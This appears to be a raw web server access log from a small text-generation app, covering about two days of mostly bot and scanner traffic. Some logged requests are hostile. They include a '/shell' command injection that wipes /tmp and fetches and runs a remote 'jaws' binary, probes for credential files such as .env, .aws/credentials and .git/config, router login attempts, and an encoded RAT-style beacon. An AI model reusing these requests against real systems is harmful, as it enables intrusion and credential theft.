+176.222.167.124 - - [18/May/2023 17:40:56] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:40:56] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:41:03] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:41:03] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:41:31] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:41:32] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:41:39] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:41:39] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:41:58] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:41:58] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.124 - - [18/May/2023 17:42:02] "GET / HTTP/1.1" 200 -
+176.222.167.124 - - [18/May/2023 17:42:02] "GET /static/style.css HTTP/1.1" 304 -
+87.250.224.225 - - [18/May/2023 17:42:51] "GET / HTTP/1.1" 200 -
+193.42.32.124 - - [18/May/2023 17:51:46] "GET / HTTP/1.1" 200 -
+43.157.32.103 - - [18/May/2023 17:54:18] "GET / HTTP/1.1" 200 -
+209.141.33.65 - - [18/May/2023 17:54:26] "GET / HTTP/1.1" 200 -
+209.141.44.114 - - [18/May/2023 17:54:28] "GET / HTTP/1.1" 200 -
+209.141.34.187 - - [18/May/2023 17:54:33] "GET /favicon.ico HTTP/1.1" 404 -
+220.94.228.162 - - [18/May/2023 18:04:48] "GET / HTTP/1.1" 200 -
+103.38.237.172 - - [18/May/2023 18:10:09] "GET / HTTP/1.1" 200 -
+167.94.138.36 - - [18/May/2023 18:12:50] "GET / HTTP/1.1" 200 -
+167.94.138.36 - - [18/May/2023 18:12:50] "GET / HTTP/1.1" 200 -
+167.94.138.36 - - [18/May/2023 18:12:51] code 505, message Invalid HTTP version (2.0)
+167.94.138.36 - - [18/May/2023 18:12:51] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.36 - - [18/May/2023 18:12:51] "GET /favicon.ico HTTP/1.1" 404 -
+109.237.97.180 - - [18/May/2023 18:35:05] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [18/May/2023 18:35:05] code 400, message Bad request version ("\x9d\x933w`\x91\x90):Ay9\x1a{ÂL\x0f\x08'Æõ;ôiwÌ/?\x84\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À")
+109.237.97.180 - - [18/May/2023 18:35:05] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03/ÙA°ú÷ø\\?Éñq8#F°âH\x99\x84:s\x9e\x94±\x1eøl8K\x1eÅ S¦\x1f\x9d\x933w`\x91\x90):Ay9\x1a{ÂL\x0f\x08'Æõ;ôiwÌ/?\x84\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+117.255.195.50 - - [18/May/2023 18:55:55] "GET / HTTP/1.1" 200 -
+41.77.131.190 - - [18/May/2023 20:17:08] "GET / HTTP/1.1" 200 -
+193.42.32.124 - - [18/May/2023 20:24:13] "GET / HTTP/1.1" 200 -
+95.108.213.146 - - [18/May/2023 21:15:51] "GET /robots.txt HTTP/1.1" 404 -
+47.100.255.132 - - [18/May/2023 22:15:44] "GET /admin/config.php HTTP/1.1" 404 -
+193.42.32.124 - - [18/May/2023 22:30:46] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+46.34.193.17 - - [18/May/2023 22:51:53] "GET /favicon.ico HTTP/1.1" 404 -
+103.12.135.123 - - [18/May/2023 23:02:11] "GET /_profiler/phpinfo HTTP/1.1" 404 -
+172.105.128.11 - - [19/May/2023 00:56:15] "GET / HTTP/1.1" 200 -
+103.38.237.172 - - [19/May/2023 01:23:34] "GET / HTTP/1.1" 200 -
+184.94.160.131 - - [19/May/2023 01:35:54] "GET / HTTP/1.1" 200 -
+66.240.205.34 - - [19/May/2023 02:10:39] code 400, message Bad request version ("x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==")
+66.240.205.34 - - [19/May/2023 02:10:39] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" HTTPStatus.BAD_REQUEST -
+35.240.121.17 - - [19/May/2023 02:11:04] "GET / HTTP/1.1" 200 -
+124.89.86.249 - - [19/May/2023 02:21:18] "GET / HTTP/1.1" 200 -
+51.254.59.113 - - [19/May/2023 02:26:26] "GET / HTTP/1.1" 200 -
+156.201.157.243 - - [19/May/2023 03:31:23] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.188.166.164/jaws;sh+/tmp/jaws HTTP/1.1')
+156.201.157.243 - - [19/May/2023 03:31:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.188.166.164/jaws;sh+/tmp/jaws HTTP/1.1" HTTPStatus.BAD_REQUEST -
+128.14.133.58 - - [19/May/2023 03:32:41] "GET / HTTP/1.1" 200 -
+94.102.61.10 - - [19/May/2023 03:37:05] "GET / HTTP/1.1" 200 -
+59.173.181.111 - - [19/May/2023 03:42:52] "GET / HTTP/1.0" 200 -
+111.85.200.250 - - [19/May/2023 03:43:15] "GET / HTTP/1.1" 200 -
+119.60.104.153 - - [19/May/2023 03:43:16] "GET /favicon.ico HTTP/1.1" 404 -
+92.244.157.102 - - [19/May/2023 04:25:30] "GET / HTTP/1.1" 200 -
+179.43.177.244 - - [19/May/2023 04:52:27] "GET / HTTP/1.1" 200 -
+110.80.136.230 - - [19/May/2023 05:08:22] "GET / HTTP/1.1" 200 -
+64.62.197.18 - - [19/May/2023 05:12:33] "GET / HTTP/1.1" 200 -
+64.62.197.31 - - [19/May/2023 05:13:58] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.30 - - [19/May/2023 05:14:36] "GET /geoserver/web/ HTTP/1.1" 404 -
+103.38.237.172 - - [19/May/2023 05:23:46] "GET / HTTP/1.1" 200 -
+178.79.182.184 - - [19/May/2023 06:16:36] "GET / HTTP/1.1" 200 -
+178.79.182.184 - - [19/May/2023 06:17:47] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+178.79.182.184 - - [19/May/2023 06:17:47] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03Õs\x14P\x8bU¦oñ¬°Ö\x10¥%\x1aQG¨³Ý©Å$\x10Jh\x90ç\x9c¹½ éÓÖýþm\x09\x19#8\x92Rvú\x87¦f§Kâ\x0eºó;\x1a5R×\x92\x88èz\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+178.79.182.184 - - [19/May/2023 06:17:48] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+178.79.182.184 - - [19/May/2023 06:17:48] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x0fÊ¯Ç\x95<\x05E+\x968\x07%?ï,ëÄægàÖóWoà4ÎWk,\x10 eþ\x0dòõ­ãì_(Ö8Üäí@\x03l\x12\x18ì³Û\x93ÆÏ\x88D\x9e \x99U\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+178.79.182.184 - - [19/May/2023 06:17:48] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+178.79.182.184 - - [19/May/2023 06:17:48] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03f û\x09ö_W·)íÔ.\x93\x81ÚÌÑ³ié\x1aÉq};&lí\x91L\x1bÇ N\x1dÂì@P©\x13ö.6ô°¡6\x9d`rÆ£nº\x9eß3¶ôÄ4jdÈ\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+110.80.136.230 - - [19/May/2023 06:33:41] "GET / HTTP/1.1" 200 -
+179.43.177.244 - - [19/May/2023 06:36:15] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+168.80.174.2 - - [19/May/2023 06:53:12] code 400, message Bad request version ('À\x13À')
+168.80.174.2 - - [19/May/2023 06:53:12] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03aDc%±âx'ªúÑUöFg\x14]M\x07\x84îëÐ¬uUZhÜÚ\x024 ypÌù\x13¬\x96¥¼"\x06~0K\x9a¹¿õÅ©\x8e\x00ä\x80H_½­eR\x9c\x09\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:13] "GET / HTTP/1.1" 200 -
+168.80.174.2 - - [19/May/2023 06:53:14] code 400, message Bad request version ('§÷\x98\x1bÿ\x04\x9c~¾¹\x04ú')
+168.80.174.2 - - [19/May/2023 06:53:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03³¡\x07öõõ\x85k\x18 öDÁ\x13h\x0c\x17\x03ÌA Í}\x1a¹\x19\x1fÒgÖE\x15 #\x07\x17(Ý\x09§÷\x98\x1bÿ\x04\x9c~¾¹\x04ú" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:16] code 400, message Bad request version ('À\x13À')
+168.80.174.2 - - [19/May/2023 06:53:16] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Y@(\x0c\x9f;\x94\x1cn8\x8e³Ã\x06l\x84®Ýá4b\x9dòß\x19x\x93t\x8a(ñ\x13 \x94\x9aÒj\x92Èn5\x07ú`ùyÎ \x09M0`t\x9cr+\x08\\\x056Ø\x96ê$0\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:17] code 400, message Bad request version ('\x93>¥ÖÆiMç¶²í\x88hmÔ\x8bE')
+168.80.174.2 - - [19/May/2023 06:53:17] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03V\x15´\x81inE\x83+\x06³t\x1ae¶\x88U»\x92 \x9dh\x98ÿCI\x08ÏÅ<Ör \x93>¥ÖÆiMç¶²í\x88hmÔ\x8bE" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:20] code 400, message Bad request version ('À\x13À')
+168.80.174.2 - - [19/May/2023 06:53:20] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x9d\x12ü%ÿ\x94\x88F¦Í5Ón\x00Õ\x7f·\x92\x18\x9f²}ú\x89×uáÁÀ»ôÅ \x9a ÎeP\x01ÿQf,\x01Ã5M\x01á\x9a°/½Æ»N§\x80\x1c'\x0còé\x9cÓ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:21] code 400, message Bad request version ('À\x13À')
+168.80.174.2 - - [19/May/2023 06:53:21] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03eY\x9b\x08\x8e\x9ep×9\x88Jg\x9e*E¾>þà$\x92\x85\x04!à¬ì$îR7\x88 ~?'\x81\x8dê7Úsîô¾VµâxjN´ÆxXjh\x11´MnÐéÜâ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+168.80.174.2 - - [19/May/2023 06:53:22] code 400, message Bad request version ('ðÆ9C\x00×î<<úJ÷\x03$û:tÞ\\ÿÒ')
+168.80.174.2 - - [19/May/2023 06:53:22] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03PRØÄ9\x02Ùâ\x01ð¦+á0<\\eÑÈQeI\x98\x85ë\x90\x1cÓ¬d\x93\x1a ðÆ9C\x00×î<<úJ÷\x03$û:tÞ\\ÿÒ\x1d" HTTPStatus.BAD_REQUEST -
+110.80.136.230 - - [19/May/2023 08:43:44] "GET / HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 08:45:24] "GET / HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 08:48:01] "GET / HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 08:49:14] "GET / HTTP/1.1" 200 -
+205.210.31.41 - - [19/May/2023 08:51:40] "GET / HTTP/1.0" 200 -
+36.225.113.77 - - [19/May/2023 08:53:29] "POST / HTTP/1.1" 405 -
+94.232.42.99 - - [19/May/2023 09:13:13] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+94.232.42.99 - - [19/May/2023 09:13:13] "\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+94.232.42.99 - - [19/May/2023 09:13:13] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+94.232.42.99 - - [19/May/2023 09:13:13] "\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+94.232.42.99 - - [19/May/2023 09:13:13] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+94.232.42.99 - - [19/May/2023 09:13:13] "\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+93.160.62.190 - - [19/May/2023 09:33:14] "GET /api/.env HTTP/1.1" 404 -
+93.160.62.190 - - [19/May/2023 09:33:14] "POST /api HTTP/1.1" 404 -
+198.235.24.132 - - [19/May/2023 09:38:31] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [19/May/2023 09:42:47] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 10:31:34] "GET / HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 10:31:49] "GET / HTTP/1.1" 200 -
+36.225.113.77 - - [19/May/2023 10:31:54] "GET / HTTP/1.1" 200 -
+213.180.203.216 - - [19/May/2023 10:32:30] "GET /robots.txt HTTP/1.1" 404 -
+95.108.213.231 - - [19/May/2023 10:32:31] "GET /files.html HTTP/1.1" 200 -
+213.180.203.76 - - [19/May/2023 10:33:02] "GET / HTTP/1.1" 200 -
+198.235.24.239 - - [19/May/2023 10:34:49] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.239 - - [19/May/2023 10:34:49] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x92Í\x16³P\x84v\x04îh¶Ð\x1e3þ\x9dL:1\x9eB\x03Þ:gu\x13vRé[b\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+162.216.150.186 - - [19/May/2023 10:47:09] "GET / HTTP/1.1" 200 -
+64.85.173.196 - - [19/May/2023 11:04:47] "GET /.env HTTP/1.1" 404 -
+64.85.173.196 - - [19/May/2023 11:04:48] "POST / HTTP/1.1" 405 -
+165.22.177.103 - - [19/May/2023 11:09:40] code 400, message Bad request version ('À\x14À')
+165.22.177.103 - - [19/May/2023 11:09:40] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ì\x94û-Ï\x93f\x99¢fâ\x1f\x95µ]·üysý\x12s°SÑuà¥B,®\x0d\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.177.103 - - [19/May/2023 11:09:40] code 400, message Bad request version ('À\x14À')
+165.22.177.103 - - [19/May/2023 11:09:40] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x13!¡\x86[\x10=Ô\x18çv\x04\x85ËÂì,ö ãâ \x913\x84ÐÐ}£\x0fì3\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.177.103 - - [19/May/2023 11:09:41] "GET / HTTP/1.1" 200 -
+165.22.177.103 - - [19/May/2023 11:09:41] "GET /client/get_targets HTTP/1.1" 404 -
+165.22.177.103 - - [19/May/2023 11:09:41] "GET /upl.php HTTP/1.1" 404 -
+165.22.177.103 - - [19/May/2023 11:09:42] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00{\x01\x00\x00w\x03\x03tà\x94\x80F\x96#$´£À3\x93±ÐÇ'*!¹¤^ÐzD³°x]Ñ×\x96\x00\x00\x1aÀ/À+À\x11À\x07À\x13À")
+165.22.177.103 - - [19/May/2023 11:09:42] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03tà\x94\x80F\x96#$´£À3\x93±ÐÇ'*!¹¤^ÐzD³°x]Ñ×\x96\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.177.103 - - [19/May/2023 11:09:42] "GET /geoip/ HTTP/1.1" 404 -
+165.22.177.103 - - [19/May/2023 11:09:42] "GET / HTTP/1.1" 200 -
+165.22.177.103 - - [19/May/2023 11:09:43] "GET /favicon.ico HTTP/1.1" 404 -
+165.22.177.103 - - [19/May/2023 11:09:43] "GET /1.php HTTP/1.1" 404 -
+152.89.196.144 - - [19/May/2023 11:29:55] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+35.203.211.126 - - [19/May/2023 11:35:42] "GET / HTTP/1.1" 200 -
+192.241.239.27 - - [19/May/2023 12:23:50] "GET /hudson HTTP/1.1" 404 -
+107.170.241.53 - - [19/May/2023 12:23:58] "GET /actuator/health HTTP/1.1" 404 -
+110.80.136.230 - - [19/May/2023 13:04:23] "GET / HTTP/1.1" 200 -
+192.155.90.220 - - [19/May/2023 13:35:40] code 400, message Bad request version ('À\x14À')
+192.155.90.220 - - [19/May/2023 13:35:40] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03þ\x96\x00¯þxÀ#\x12ÏÙ¥4æ~Q2vR$½íZ&\x96\x17Náà\x98\x9d\x8d\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+128.1.248.42 - - [19/May/2023 14:01:05] "GET / HTTP/1.1" 200 -
+128.1.248.42 - - [19/May/2023 14:01:06] "GET /showLogin.cc HTTP/1.1" 404 -
+139.162.193.205 - - [19/May/2023 15:17:30] "GET / HTTP/1.1" 200 -
+139.162.193.205 - - [19/May/2023 15:18:44] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+139.162.193.205 - - [19/May/2023 15:18:44] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03ù±Ó´ZÃÀ<1ÔÆ<\x03\x95\x94áä\x09s\x84§\x1d\x98ç-\x91\x14+è%S& pxà9?`F3\x11Å¹¶¢d\x15{mS¿ë\x0b¦Ô\x0c\x8d\x9cû´kG\x8b$\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+139.162.193.205 - - [19/May/2023 15:18:44] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+139.162.193.205 - - [19/May/2023 15:18:44] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03²XU)á0ø¦\x10ýÙ©Ê(>\x15Ð\x8d\x0d\x99gW¯üÙÀ¸\x9f\x83$\x9dÝ &;Zó³\x11\x05\x07Ã\x90éT\x8cÝ9ý\x0fs\x8d¾í\x10õD¤\x8c\x91_@xh5\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+139.162.193.205 - - [19/May/2023 15:18:44] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+139.162.193.205 - - [19/May/2023 15:18:44] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03Ì¤\x1dsù\x17\x08£\x7fØ\x1aÔ¿\x81,a.\x14\x03\x1a^M&YÕX\x80¬\x8d¬FO \x1dMÎ!Æ\x00Ùy^wÜgßó\x03¯»\x8aÿMìÿB3ð|(êo\x97\x1dh\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+8.140.167.137 - - [19/May/2023 15:29:49] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" 404 -
+167.248.133.49 - - [19/May/2023 15:31:45] "GET / HTTP/1.1" 200 -
+167.248.133.49 - - [19/May/2023 15:31:45] "GET / HTTP/1.1" 200 -
+167.248.133.49 - - [19/May/2023 15:31:46] code 505, message Invalid HTTP version (2.0)
+167.248.133.49 - - [19/May/2023 15:31:46] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.248.133.49 - - [19/May/2023 15:31:46] "GET /favicon.ico HTTP/1.1" 404 -
+87.236.176.129 - - [19/May/2023 16:11:58] "GET / HTTP/1.1" 200 -
+165.22.196.7 - - [19/May/2023 16:31:41] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Æ`\xad\x12¤DCÞ\x96^>\x17\x9b\x97Ñ\x83a\x12YeÈo«¯P®,|Fà\x8b\x9e\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+165.22.196.7 - - [19/May/2023 16:31:41] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Æ`­\x12¤DCÞ\x96^>\x17\x9b\x97Ñ\x83a\x12YeÈo«¯P®,|Fà\x8b\x9e\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.196.7 - - [19/May/2023 16:31:41] code 400, message Bad request version ('À\x14À')
+165.22.196.7 - - [19/May/2023 16:31:41] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¬cIrcÆ[:¬tmA\x89\x8ad\x13È\x09 F¦¢\x9dËâ¬\x12\x85NÌnø\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.196.7 - - [19/May/2023 16:31:41] "GET / HTTP/1.1" 200 -
+165.22.196.7 - - [19/May/2023 16:31:42] "GET /client/get_targets HTTP/1.1" 404 -
+165.22.196.7 - - [19/May/2023 16:31:42] "GET /upl.php HTTP/1.1" 404 -
+165.22.196.7 - - [19/May/2023 16:31:42] code 400, message Bad request version ('À\x14À')
+165.22.196.7 - - [19/May/2023 16:31:42] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9dÁ¨\\R+\x0e¤;\x86µlÙëýÇñ\x05v ÊÉÈ\x17xM\x92\x0eWÉa·\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.22.196.7 - - [19/May/2023 16:31:42] "GET /geoip/ HTTP/1.1" 404 -
+165.22.196.7 - - [19/May/2023 16:31:42] "GET / HTTP/1.1" 200 -
+165.22.196.7 - - [19/May/2023 16:31:43] "GET /favicon.ico HTTP/1.1" 404 -
+165.22.196.7 - - [19/May/2023 16:31:43] "GET /1.php HTTP/1.1" 404 -
+69.162.243.124 - - [19/May/2023 17:14:23] "GET /admin/.env HTTP/1.1" 404 -
+69.162.243.124 - - [19/May/2023 17:14:23] "POST /admin HTTP/1.1" 404 -
+74.208.16.82 - - [19/May/2023 18:16:19] "GET /.env HTTP/1.1" 404 -
+74.208.16.82 - - [19/May/2023 18:16:20] "GET /wp-content/ HTTP/1.1" 404 -
+176.97.210.100 - - [19/May/2023 18:27:07] "GET /login.htm HTTP/1.0" 404 -
+185.99.33.202 - - [19/May/2023 18:31:58] "GET / HTTP/1.1" 200 -
+193.32.162.189 - - [19/May/2023 18:52:29] "GET /doc/xml/version.xml HTTP/1.1" 404 -
+35.240.121.17 - - [19/May/2023 18:57:41] "GET / HTTP/1.1" 200 -
+170.78.61.46 - - [19/May/2023 19:22:11] "GET / HTTP/1.1" 200 -
+35.93.38.199 - - [19/May/2023 20:13:33] "GET /.svn/wc.db HTTP/1.1" 404 -
+128.14.209.162 - - [19/May/2023 20:17:28] "GET / HTTP/1.1" 200 -
+107.170.237.23 - - [19/May/2023 20:32:06] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+107.170.237.23 - - [19/May/2023 20:32:06] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+35.93.38.199 - - [19/May/2023 21:00:59] "GET /.aws/credentials HTTP/1.1" 404 -
+110.80.136.230 - - [19/May/2023 21:26:07] "GET / HTTP/1.1" 200 -
+213.232.113.228 - - [19/May/2023 21:37:11] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+89.114.94.207 - - [19/May/2023 21:50:11] "GET /app/.env HTTP/1.1" 404 -
+89.114.94.207 - - [19/May/2023 21:50:11] "POST /app HTTP/1.1" 404 -
+35.93.38.199 - - [19/May/2023 21:55:10] "GET /.git/config HTTP/1.1" 404 -
+194.180.48.85 - - [19/May/2023 22:04:57] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+104.152.52.155 - - [19/May/2023 22:14:26] "GET / HTTP/1.0" 200 -
+34.27.228.103 - - [19/May/2023 23:15:45] "GET / HTTP/1.1" 200 -
+176.97.210.76 - - [19/May/2023 23:34:20] "GET / HTTP/1.1" 200 -
+159.65.111.248 - - [20/May/2023 00:12:24] "GET / HTTP/1.0" 200 -
+193.32.162.189 - - [20/May/2023 00:37:52] "GET /doc/xml/version.xml HTTP/1.1" 404 -
+198.235.24.117 - - [20/May/2023 00:43:56] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x80PF¥ú,%_\x1bÇÚHêg÷WzÓÀf-'\x1b\x91è\x0e8vìøC¢\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+198.235.24.117 - - [20/May/2023 00:43:56] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x80PF¥ú,%_\x1bÇÚHêg÷WzÓÀf-'\x1b\x91è\x0e8vìøC¢\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+4.16.142.230 - - [20/May/2023 01:10:41] "GET /laravel/.env HTTP/1.1" 404 -
+4.16.142.230 - - [20/May/2023 01:10:41] "POST /laravel HTTP/1.1" 404 -
+103.203.57.7 - - [20/May/2023 01:17:05] "GET / HTTP/1.1" 200 -
+193.32.162.189 - - [20/May/2023 01:43:51] "GET / HTTP/1.1" 200 -
+34.76.158.233 - - [20/May/2023 01:55:24] "GET / HTTP/1.1" 200 -
+198.235.24.254 - - [20/May/2023 02:03:13] "GET / HTTP/1.0" 200 -
+89.114.94.207 - - [20/May/2023 02:11:26] "GET /backend/.env HTTP/1.1" 404 -
+89.114.94.207 - - [20/May/2023 02:11:26] "POST /backend HTTP/1.1" 404 -
+103.181.26.158 - - [20/May/2023 03:43:29] "GET / HTTP/1.1" 200 -
+198.57.27.37 - - [20/May/2023 03:56:40] "GET /.env HTTP/1.1" 404 -
+198.57.27.37 - - [20/May/2023 03:56:43] "GET /wp-content/ HTTP/1.1" 404 -
+162.216.150.181 - - [20/May/2023 05:29:30] "GET / HTTP/1.1" 200 -
+193.35.18.35 - - [20/May/2023 05:32:29] "GET / HTTP/1.1" 200 -
+20.210.201.75 - - [20/May/2023 05:48:13] "GET / HTTP/1.1" 200 -
+20.210.201.75 - - [20/May/2023 05:48:14] "GET /HNAP1/ HTTP/1.1" 404 -
+172.104.242.173 - - [20/May/2023 05:49:25] code 400, message Bad request version ('¯+\xadKkÅà\\s\x9c½Ë')
